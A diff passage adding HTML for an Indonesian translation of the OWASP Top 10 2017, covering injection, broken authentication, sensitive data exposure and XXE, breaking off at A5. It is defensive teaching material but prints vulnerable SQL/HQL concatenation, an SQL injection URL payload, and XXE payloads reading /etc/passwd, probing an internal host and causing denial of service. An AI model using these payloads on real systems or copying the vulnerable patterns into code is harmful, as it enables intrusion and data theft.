+<li>Data yang dipasok pengguna tidak divalidasi, disaring, atau disterilkan oleh aplikasi.</li>
+<li>Permintaan dinamis atau panggilan non-parameter tanpa tanpa sadar konteks digunakan langsung di penerjemah.</li>
+<li>Data yang tidak bersahabat digunakan dalam parameter pencarian pemetaan objek-relasional (ORM) untuk mengekstrak catatan sensitif tambahan.</li>
+<li>Data yang tidak bersahabat langsung digunakan atau digabungkan, sehingga SQL atau perintah berisi data struktur dan data yang tidak bersahabat dalam query dinamis, perintah, atau prosedur tersimpan.</li>
+<li>Beberapa injeksi yang lebih umum adalah perintah SQL, NoSQL, OS, pemetaan Object Relational Mapping (ORM), LDAP, dan Expression Language (EL) atau Object Graph Navigation Library (OGNL). Konsepnya identik diantara semua penafsir. Source code review adalah metode terbaik untuk mendeteksi jika aplikasi rentan terhadap injeksi, diikuti dengan pengujian otomatis secara menyeluruh terhadap semua parameter, header, URL, cookies, JSON, SOAP, dan data XML. Organisasi dapat menyertakan sumber statis (<a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a>) dan uji aplikasi dinamis (<a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a>) alat ke dalam pipa CI / CD untuk mengidentifikasi kelemahan injeksi yang baru diperkenalkan sebelum penggelaran produksi.</li>
+</ul>
+<h2 id="bagaimana-cara-pencegahannya">Bagaimana Cara Pencegahannya</h2>
+<p>Mencegah injeksi membutuhkan data terpisah dari perintah dan query.</p>
+<ul>
+<li>Pilihan yang lebih disukai adalah menggunakan API yang aman, yang menghindari penggunaan penafsir sepenuhnya atau menyediakan parameter antarmuka, atau bermigrasi untuk menggunakan Object Relational Mapping Tools (ORMs). ** Catatan **: Meskipun parameter, prosedur yang tersimpan masih dapat mengenalkan injeksi SQL jika PL / SQL atau T-SQL menggabungkan query dan data, atau mengeksekusi data yang bentrok dengan EXECUTE IMMEDIATE atau exec ().</li>
+<li>Gunakan validasi masukan positive server-side atau "whitelist". Ini bukan pertahanan yang lengkap karena banyak aplikasi memerlukan karakter khusus, seperti area teks atau API untuk aplikasi mobile.</li>
+<li>Untuk setiap sisa query dinamis, lepaskan karakter khusus menggunakan sintaks keluar khusus untuk penerjemah itu. ** Catatan **: Struktur SQL seperti nama tabel, nama kolom, dan sebagainya tidak dapat diloloskan, dan dengan demikian nama-nama struktur pengguna yang diberikan berbahaya. Ini adalah masalah umum dalam perangkat lunak penulisan laporan.</li>
+<li>Gunakan LIMIT dan kontrol SQL lainnya dalam query untuk mencegah penyebaran rekaman secara massal jika terjadi injeksi SQL.</li>
+</ul>
+<h2 id="contoh-skenario-serangan">Contoh Skenario Serangan</h2>
+<p><strong>Skenario #1</strong>: Aplikasi menggunakan data yang tidak terpercaya dalam pembuatan panggilan SQL yang rentan berikut ini:</p>
+<p><code>String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";</code></p>
+<p><strong>Skenario #2</strong>: Demikian pula, kepercayaan buta huruf aplikasi dalam kerangka kerja dapat menghasilkan query yang masih rentan, (misalnya Hibernate Query Language (HQL)):</p>
+<p><code>Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");</code></p>
+<p>Dalam kedua kasus tersebut, penyerang memodifikasi nilai parameter 'id' di browser mereka untuk mengirim: 'atau' 1 '=' 1. Sebagai contoh:</p>
+<p><code>https://example.com/app/accountView?id=' or '1'='1</code></p>
+<p>Ini mengubah arti kedua query untuk mengembalikan semua catatan dari tabel akun. Serangan yang lebih berbahaya bisa mengubah atau menghapus data, atau bahkan memanggil prosedur yang tersimpan.</p>
+<h2 id="referensi-1">Referensi</h2>
+<h3 id="owasp-1">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c3-secure-database">OWASP Proactive Controls: Parameterize Queries</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md">OWASP ASVS: V5 Input Validation and Encoding</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">OWASP Testing Guide: SQL Injection</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">Command Injection</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection">ORM injection</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: Injection Prevention</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: SQL Injection Prevention</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html_in_Java">OWASP Cheat Sheet: Injection Prevention in Java</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">OWASP Cheat Sheet: Query Parameterization</a></li>
+<li><a href="https://owasp.org/www-project-automated-threats-to-web-applications/">OWASP Automated Threats to Web Applications – OAT-014</a></li>
+</ul>
+<h3 id="external">External</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/564.html">CWE-564: Hibernate Injection</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917: Expression Language Injection</a></li>
+<li><a href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger: Server-side template injection</a></li>
+</ul>
+<h1 id="a22017-kerusakan-autentikasi">A2:2017 Kerusakan Autentikasi</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Agen ancaman / vektor serangan</th>
+<th>Kelemahan Keamanan</th>
+<th>Dampak</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Akses Lvl: Eksploitasi 3</td>
+<td>Prevalensi 2: Deteksi 2</td>
+<td>Teknis 3: Bisnis</td>
+</tr>
+<tr class="even">
+<td>Penyerang memiliki akses ke ratusan juta kombinasi nama pengguna dan sandi yang valid untuk isian kredensial, daftar akun administratif default, brute force otomatis, dan alat dictionary attack. Serangan manajemen sesi dipahami dengan baik, terutama terkait dengan sesi token yang belum habis.</td>
+<td>Prevalensi otentikasi yang terputus tersebar luas karena desain dan implementasi sebagian besar identitas dan kontrol akses. Manajemen sesi adalah fondasi otentikasi dan kontrol akses, dan hadir dalam semua aplikasi berstatus. Penyerang dapat mendeteksi autentikasi yang rusak menggunakan cara manual dan memanfaatkannya menggunakan alat otomatis dengan daftar kata sandi dan dictionary attack.</td>
+<td>Penyerang harus mendapatkan akses pada beberapa akun, atau hanya satu akun admin untuk membahayakan sistem. Bergantung pada domain aplikasi, ini mungkin mengizinkan pencucian uang, penipuan keamanan sosial, dan pencurian identitas, atau mengungkapkan informasi sensitif yang dilindungi secara hukum.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-itu-rentan-1">Apakah Aplikasi itu Rentan?</h2>
+<p>Konfirmasi identitas pengguna, otentikasi, dan manajemen sesi sangat penting untuk melindungi terhadap serangan terkait otentifikasi.</p>
+<p>Mungkin ada kelemahan otentikasi jika aplikasi:</p>
+<ul>
+<li>Izin serangan otomatis seperti <a href="https://owasp.org/www-community/attacks/Credential_stuffing">mengisi kredensial</a>, dimana penyerang memiliki daftar username dan password yang valid.</li>
+<li>Memungkinkan brute force atau serangan otomatis lainnya.</li>
+<li>Memungkinkan password default, lemah, atau terkenal, seperti "Password1" atau "admin / admin".</li>
+<li>Menggunakan proses pemulihan kredensial yang lemah atau tidak efektif dan proses lupa kata sandi, seperti "jawaban berbasis pengetahuan", yang tidak dapat dilakukan dengan aman.</li>
+<li>Menggunakan kata kunci plain text, encrypted, atau dengan hash yang lemah (lihat <strong>A3: 2017-Sensitive Data Exposure</strong>).</li>
+<li>Memiliki otentikasi multi faktor yang hilang atau tidak efektif.</li>
+<li>Memaparkan ID Sesi di URL (mis., Penulisan ulang URL).</li>
+<li>Tidak memutar Sesi ID setelah berhasil masuk.</li>
+<li>Membatalkan ID Sesi secara tidak benar. Sesi pengguna atau token otentikasi (terutama token single sign-on (SSO)) tidak benar-benar dianggap tidak berlaku saat logout atau periode tidak aktif.</li>
+</ul>
+<h2 id="bagaimana-cara-mencegahnya">Bagaimana Cara Mencegahnya</h2>
+<ul>
+<li>Bila memungkinkan, terapkan autentikasi multi-faktor untuk mencegah pengisian otomatis, credential stuffing, brute force, dan penggunaan kembali kredensial bekas pakai yang dicuri.</li>
+<li>Jangan mengirim atau menyebarkan dengan kredensial default, terutama untuk pengguna admin.</li>
+<li>Lakukan pengecekan password lemah, seperti menguji password baru atau yang telah diubah terhadap daftar <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">10000 password terburuk teratas</a>.</li>
+<li>Sejajarkan panjang kata sandi, kompleksitas dan kebijakan rotasi dengan <a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST 800-63 B panduan di bagian 5.1.1 untuk Rahasia Memoris</a> atau kebijakan sandi berbasis kebijakan yang modern lainnya.</li>
+<li>Pastikan pendaftaran, pemulihan kredensial, dan jalur API disulitkan melawan serangan akun satu per satu dengan menggunakan pesan yang sama untuk semua hasil.</li>
+<li>Batasi atau tingkatkan penundaan upaya login yang gagal. Log semua kegagalan dan peringatan administrator saat credential stuffing, brute force, atau serangan lain yang terdeteksi.</li>
+<li>Gunakan manajer sesi server-side, secure, built-in yang menghasilkan ID sesi acak baru dengan keunikan tinggi setelah login. Sesi ID tidak boleh berada di URL, disimpan dengan aman dan tidak valid setelah logout, idle, dan timeout absolut.</li>
+</ul>
+<h2 id="contoh-skenario-serangan-1">Contoh Skenario Serangan</h2>
+<p><strong>Skenario #1</strong>: <a href="https://owasp.org/www-community/attacks/Credential_stuffing">Credential stuffing</a>, penggunaan <a href="https://github.com/danielmiessler/SecLists">daftar kata sandi yang dikenal</a>, adalah serangan yang umum. Jika sebuah aplikasi tidak menerapkan ancaman Credential stuffing atau ancaman otomatis, aplikasi tersebut dapat digunakan sebagai kata sandi untuk menentukan apakah kredensial tersebut valid.</p>
+<p><strong>Skenario #2</strong>: Sebagian besar serangan otentikasi terjadi karena terus menggunakan kata kunci sebagai satu-satunya faktor. Setelah dianggap sebagai praktik terbaik, persyaratan perumusan kata sandi dan kompleksitas dipandang mendorong pengguna untuk menggunakan, dan menggunakan kembali, kata kunci yang lemah. Organisasi merekomendasikan untuk menghentikan praktik ini per NIST 800-63 dan menggunakan autentikasi multi faktor.</p>
+<p><strong>Skenario #3</strong>: Batas waktu sesi aplikasi tidak diatur dengan benar. Pengguna menggunakan komputer umum untuk mengakses aplikasi. Alih-alih memilih "logout" pengguna cukup menutup tab browser dan berjalan pergi. Penyerang menggunakan browser yang sama satu jam kemudian, dan pengguna masih diotentifikasi.</p>
+<h2 id="referensi-2">Referensi</h2>
+<h3 id="owasp-2">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c6-digital-identity">OWASP Proactive Controls: Implement Identity and Authentication Controls</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Application Security Verification Standard: V2 Authentication</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x12-V3-Session-management.md">OWASP Application Security Verification Standard: V3 Session Management</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/README">OWASP Testing Guide: Identity</a> and <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/README">Authentication</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html">OWASP Cheat Sheet: Authentication</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: Credential Stuffing</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html">OWASP Cheat Sheet: Forgot Password</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">OWASP Cheat Sheet: Session Management</a></li>
+<li><a href="https://owasp.org/www-project-automated-threats-to-web-applications/">OWASP Automated Threats Handbook</a></li>
+</ul>
+<h3 id="external-1">External</h3>
+<ul>
+<li><a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST 800-63b: 5.1.1 Memorized Secrets</a> - for thorough, modern, evidence-based advice on authentication.</li>
+<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384: Session Fixation</a></li>
+</ul>
+<h1 id="a32017-pengungkapan-data-sensitif">A3:2017 Pengungkapan Data Sensitif</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Agen ancaman / vektor serangan</th>
+<th>Kelemahan Keamanan</th>
+<th>Dampak</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Akses Lvl: Eksploitasi 2</td>
+<td>Prevalensi 3: Deteksi 2</td>
+<td>Teknis 3: Bisnis</td>
+</tr>
+<tr class="even">
+<td>Daripada secara langsung menyerang crypto, Penyerang memilih untuk mencuri keys, mengeksekusi metode serangan man-in-the-middle, atau mencuri data teks yang jelas dari server, saat dalam proses, atau dari klien pengguna, mis. browser. Serangan manual umumnya diperlukan. Password Database yang sebelumnya diambil bisa diambil dengan metode brute force dengan kemampuan Graphics Processing Units (GPU).</td>
+<td>Beberapa tahun terakhir ini, Hal ini menjadi serangan yang paling umum. Kelemahan yang paling umum adalah tidak melakukan enkripsi data yang sensitif. Ketika crypto digunakan, pembuatan dan manajemen key yang lemah, serta algoritma yang lemah, penggunaan protokol dan penggunaan cipher sering terjadi, terutama untuk teknik penyimpanan hashing sandi yang lemah. Untuk data dalam transit, kelemahan sisi server mudah terdeteksi, tetapi sulit untuk terdeteksi bagi data saat yang dalam keadaan tidak terpakai atau tidak berubah.</td>
+<td>Kegagalan sering membuat semua data yang seharusnya dilindungi dapat dilihat. Biasanya, informasi ini mencakup informasi pribadi sensitif (PII) seperti catatan kesehatan, kredensial, data pribadi, dan kartu kredit, yang seringkali memerlukan perlindungan seperti yang ditentukan oleh hukum atau peraturan seperti undang-undang GDPR atau undang-undang privasi setempat.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-itu-rentan-2">Apakah Aplikasi itu Rentan?</h2>
+<p>Hal pertama adalah menentukan kebutuhan proteksi data saat transit dan saat tidak digunakan. Misalnya, kata sandi, nomor kartu kredit, catatan kesehatan, informasi pribadi dan rahasia bisnis memerlukan perlindungan yang ekstra, terutama jika data tersebut termasuk dalam undang-undang privasi, mis. Peraturan Perlindungan Data Umum UE (GDPR), atau peraturan, mis. perlindungan data keuangan seperti PCI Data Security Standard (PCI DSS). Untuk semua data tersebut:</p>
+<ul>
+<li>Apakah ada data yang dikirimkan dalam bentuk teks yang jelas? Ini menyangkut protokol seperti HTTP, SMTP, dan FTP. Lalu lintas internet luar sangatlah berbahaya. Lakukan verifikasi semua lalu lintas internal dan mis seperti diantara load balancer, web server, atau sistem back-end.</li>
+<li>Apakah ada algoritma kriptografi yang telah usang atau cukup lemah yang digunakan secara default atau dalam kode yang lebih lama?</li>
+<li>Apakah kunci kripto default sedang digunakan, atau mungkin kunci kripto yang lemah yang dihasilkan atau digunakan kembali, atau manajemen kunci serta rotasi krypto yang harusnya tepat malah hilang?</li>
+<li>Apakah enkripsi tidak diberlakukan. apakah ada perintah agen pengguna browser(peramban) seperti arahan dalam keamanan atau tajuk(header) yang telah hilang?</li>
+<li>Apakah agen pengguna (misalnya aplikasi, klien email) tidak memverifikasi bila sertifikat server yang diterima valid?</li>
+</ul>
+<p>Lihat ASVS <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x14-V6-Cryptography.md">Crypto (V6)</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x16-V8-Data-Protection.md">Data Protection (V8)</a> and <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x17-V9-Communications.md">SSL/TLS (V9)</a>.</p>
+<h2 id="cara-mencegah">Cara Mencegah</h2>
+<p>Lakukan hal berikut, setidaknya minimal kita harus dan baca rujukannya:</p>
+<ul>
+<li>Klasifikasikan data yang diproses, disimpan atau dikirim oleh aplikasi. Identifikasi data mana yang sensitif menurut hukum privasi, persyaratan peraturan, atau kebutuhan bisnis.</li>
+<li>Terapkan kontrol sesuai klasifikasi.</li>
+<li>Jangan menyimpan data sensitif secara tidak perlu. Buang sesegera mungkin atau gunakan tokenisasi sesuai standar PCI DSS atau bahkan pemotongannya. Data yang tidak disimpan tidak bisa dicuri.</li>
+<li>Pastikan untuk mengenkripsi semua data sensitif saat tidak digunakan.</li>
+<li>Pastikan algoritma, protokol, dan kunci standar yang kuat selalu sesuai dengan yang baru ada; gunakan manajemen kunci yang tepat.</li>
+<li>Enkripsikan semua data dalam transit dengan protokol aman seperti TLS dengan kriptifikasi keamanan maju yang sempurna (PFS), prioritas cipher oleh server, dan parameter yang aman. Terapkan enkripsi menggunakan arahan seperti HTTP Strict Transport Security (HSTS).</li>
+<li>Nonaktifkan caching untuk respon yang mengandung data sensitif.</li>
+<li>Simpan kata sandi dengan menggunakan fungsi hashing adaptif yang kuat dengan faktor kerja (faktor keterlambatan), seperti <a href="https://github.com/p-h-c/phc-winner-argon2">Argon2</a>, <a href="https://wikipedia.org/wiki/Scrypt">scrypt</a>, <a href="https://wikipedia.org/wiki/Bcrypt">bcrypt</a> or <a href="https://wikipedia.org/wiki/PBKDF2">PBKDF2</a>.</li>
+<li>Verifikasi secara independen efektivitas pada konfigurasi dan pengaturan.</li>
+</ul>
+<h2 id="contoh-skenario-serangan-2">Contoh Skenario Serangan</h2>
+<p><strong>Skenario #1</strong>: Aplikasi mengenkripsi nomor kartu kredit dalam database menggunakan enkripsi dengan basis data otomatis. Namun, data ini secara otomatis didekripsi saat diambil, memungkinkan celah untuk injeksi SQL untuk mengambil nomor kartu kredit dengan tulisan yang jelas.</p>
+<p><strong>Skenario #2</strong>: Situs tidak menggunakan atau memberlakukan TLS untuk semua halaman atau enkripsinya lemah. Penyerang memonitor lalu lintas jaringan (misalnya di jaringan nirkabel yang tidak aman), menurunkan koneksi dari HTTPS ke HTTP, mencegat permintaan, dan mencuri cookie dari pengguna. Penyerang kemudian memutar ulang cookie ini dan membajak sesi pengguna (dikonfirmasi), mengakses atau memodifikasi data pribadi pengguna. Alih-alih di atas, mereka dapat mengubah semua data yang diangkut, mis. penerima transfer uang</p>
+<p><strong>Skenario #3</strong>: Database kata sandi menggunakan hash yang kurang kuat atau sederhana untuk menyimpan kata kunci setiap orang. Sebuah file upload fluge memungkinkan penyerang untuk mengambil database password. Semua hash yang tidak dikriptografikan dapat terkena serangan dengan metode rainbow table dari hash yang telah dihitung sebelumnya. Hash yang dihasilkan oleh fungsi hash sederhana atau hash cepat dapat di-crack oleh GPU, bahkan walaupun telah dikriptografikan.</p>
+<h2 id="referensi-3">Referensi</h2>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c8-protect-data-everywhere">OWASP Proactive Controls: Protect Data</a></li>
+<li><a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard</a>: <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x14-V6-Cryptography.md">V6</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x16-V8-Data-Protection.md">9</a>, <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x17-V9-Communications.md">10</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">OWASP Cheat Sheet: Transport Layer Protection</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/User_Privacy_Protection_Cheat_Sheet.html">OWASP Cheat Sheet: User Privacy Protection</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">OWASP Cheat Sheet: Password</a> and <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html">Cryptographic Storage</a></li>
+<li><a href="https://owasp.org/www-project-secure-headers/">OWASP Security Headers Project</a>; <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html">Cheat Sheet: HSTS</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README">OWASP Testing Guide: Testing for weak cryptography</a></li>
+</ul>
+<h3 id="eksternal-1">Eksternal</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/220.html">CWE-220: Exposure of sens. information through data queries</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/310.html">CWE-310: Cryptographic Issues</a>; <a href="https://cwe.mitre.org/data/definitions/311.html">CWE-311: Missing Encryption</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/312.html">CWE-312: Cleartext Storage of Sensitive Information</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326: Weak Encryption</a>; <a href="https://cwe.mitre.org/data/definitions/327.html">CWE-327: Broken/Risky Crypto</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/359.html">CWE-359: Exposure of Private Information - Privacy Violation</a></li>
+</ul>
+<h1 id="a42017-xml-external-entities-xxe">A4:2017 XML External Entities (XXE)</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Agen ancaman / vektor serangan</th>
+<th>Kelemahan Keamanan</th>
+<th>Dampak</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Access Lvl : Eksploitasi 2</td>
+<td>Prevalensi 3: Deteksi 2</td>
+<td>Teknis 3: Bisnis</td>
+</tr>
+<tr class="even">
+<td>Penyerang dapat mengeksploitasi yaitu pemproses XML yang rentan jika mereka dapat mengunggah XML atau menyertakan konten yang jelek atau tidak sesuai dalam dokumen sebuah XML, mereka dapat mengeksploitasi kode yang rentan, dependencies atau integrasi.</td>
+<td>Secara default, banyak pemproses XML yang lebih lama untuk memperbolehkan spesifikasi entitas eksternal, URI yang direferensikan dan dievaluasi selama pemrosesan XML. <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a> tool apat dapat menemukan masalah ini dengan memeriksa dependensi dan konfigurasi. <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> tool memerlukan langkah manual tambahan untuk mendeteksi dan memanfaatkan masalah ini. Manual tester perlu untuk dilatih tentang cara menguji XXE, karena hal ini tidak umum diuji pada tahun 2017.</td>
+<td>Kelemahan ini dapat digunakan untuk mengekstrak data, menjalankan permintaan jarak jauh dari server, scan sistem internal, melakukan metode denial-of-service attack, serta melakukan serangan lainnya.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-itu-rentan-3">Apakah Aplikasi itu Rentan?</h2>
+<p>Aplikasi dan layanan web berbasis XML tertentu atau integrasi downstream mungkin rentan terhadap serangan bilamana:</p>
+<ul>
+<li>Aplikasi menerima XML secara langsung atau unggahan XML, terutama dari sumber yang tidak tepercaya, atau menyisipkan data yang tidak tepercaya ke dalam dokumen XML, yang kemudian diurai oleh pemroses XML.</li>
+<li>Setiap prosesor XML dalam aplikasi atau layanan web berbasis SOAP memiliki <a href="https://en.wikipedia.org/wiki/Document_type_definition"><em>document type definitions (DTDs</em>)</a> yang diperbolehkan. Karena mekanisme yang tepat untuk menonaktifkan pemrosesan DTD cukup bervariasi berdasarkan pemprosesan XML, praktik yang baik untuk mempelajari dapat menggunakan referensi seperti <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet 'XXE Prevention'</a>.</li>
+<li>bilamana aplikasi tersebut menggunakan SAML untuk tools dalam pemrosesan identitas dalam keamanan yang telah difederalkan atau dengan single sign on(SSO). SAML menggunakan XML untuk asersi identitas, dan sangat mungkin bahwa hal itu rentan.</li>
+<li>bilamana aplikasi tersebut menggunakan versi SOAP sebelumnya hingga versi 1.2, biasanya hal yang rentan serangan XXE adalah saat entitas XML dikirim atau dioper menuju framework SOAP.</li>
+<li>Untuk menjadi rentan dari serangan XXE biasanya berarti aplikasi tersebut cukup rentan untuk menolak serangan service termasuk metode Billion Laughs Attack.</li>
+</ul>
+<h2 id="cara-untuk-mencegah">Cara untuk mencegah</h2>
+<p>Pelatihan untuk Developer sangatlah esensial untuk mengidentifikasi dan memitigasi serangan XXE. Tak hanya itu, mencegah serangan XXE membutuhkan hal sebagai berikut :</p>
+<ul>
+<li>Bila memungkinkan, gunakan data format yang tidak terlalu kompleks seperti JSON, dan hindari serialisasi dari data yang bersifat sensitif.</li>
+<li>patch atau tingkatkan seluru pemroses XML dan library yang digunakan oleh aplikasi tersebut atau yang berada diatas Sistem Operasi(OS). Gunakan Pemeriksa dependency. Kemudian update SOAP ke SOAP dengan versi 1.2 atau yang lebih tinggi</li>
+<li>Nonaktifkan Eksternal Entitas XML dan Pemrosesan DTD di semua pengurai XML dalam aplikasi, sesuai dengan referensi <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet 'Pencegahan XXE'</a>.</li>
+<li>Implementasikan daftar putih positif yang berada pada sisi server untuk validator input, pemfilteran atau sanitasi untuk mencegah data yang tidak bersahabat yang berada didalam dokumen XML.</li>
+<li>Verifikasikan XML tersebut atau unggah file XSL fungsionalitas untuk memvalidasi XML yang akan masuk menggunakan validator seperti XSD atau yang lain yang persis.</li>
+<li>Alat seperti SAST dapat membantu mendeteksi serangan XXE didalam sebuah source code, walau review code manual adalah alternatif terbaik dalam jumlah yang besar seperti aplikasi kompleks dengan banyak integrasi.</li>
+</ul>
+<p>bila kontrol ini tidak dimungkinkan maka dengan mempertimbangkan untuk menggunakan virtual patching, Gateway keamanan API, atau Firewall dari APlikasi (WAFs) untuk mendeteksi, memonitor dan melakukan blocking pada serangan XXE.</p>
+<h2 id="contoh-skenario-serangan-3">Contoh Skenario Serangan</h2>
+<p>Banyak sekali serangan XXE pada publik yang telah ditemukan, termasuk serangan pada perangkat tanam. XXE dapat terjadi dibanyak tempat yang tidak diekspektasikan, termasuk dependencies bersarang yang sangat dalam. Hal yang paling mudah adalah dengan mengupload sebuah file XML yang mencurigakan, bila diterima maka:</p>
+<p><strong>Skenario #1</strong>: Penyerang berupaya untuk mengekstrak data dari sebuah server:</p>
+<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+    &lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
+<p><strong>Skenario #2</strong>: Sebuah penyerang menyelidiki server pribadi dengan mengganti kode entitas di atas menjadi:</p>
+<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private&quot; &gt;]&gt;</code></pre>
+<p><strong>Skenario #3</strong>: Sebuah penyerang berupaya untuk melakukan metode serangan denial-of-service dan berpotensial menggunakan endless file atau file yang tidak ada habisnya dengan seperti berikut:</p>
+<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code></pre>
+<h2 id="referensi-4">Referensi</h2>
+<h3 id="owasp-3">OWASP</h3>
+<ul>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Application Security Verification Standard</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection">OWASP Testing Guide: Testing for XML Injection</a></li>
+<li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">OWASP XXE Vulnerability</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: XXE Prevention</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">OWASP Cheat Sheet: XML Security</a></li>
+</ul>
+<h3 id="external-2">External</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611: Improper Restriction of XXE</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Laughs Attack</a></li>
+<li><a href="https://secretsofappsecurity.blogspot.tw/2017/01/saml-security-xml-external-entity-attack.html">SAML Security XML External Entity Attack</a></li>
+<li><a href="https://web-in-security.blogspot.tw/2014/11/detecting-and-exploiting-xxe-in-saml.html">Detecting and exploiting XXE in SAML Interfaces</a></li>
+</ul>
+<h1 id="a52017-kontrol-akses-yang-buruk">A5:2017 Kontrol Akses Yang Buruk</h1>
+<table>
+<thead>
+<tr class="header">
